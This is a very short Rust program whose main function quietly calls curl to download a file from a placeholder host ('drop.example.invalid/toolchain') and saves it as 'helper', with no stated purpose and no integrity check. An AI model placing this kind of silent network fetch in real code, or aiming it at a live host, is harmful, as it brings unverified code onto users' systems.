fn main() {
    std::process::Command::new("curl")
        .args(["-s", "http://drop.example.invalid/toolchain", "-o", "helper"])
        .status()
        .unwrap();
}
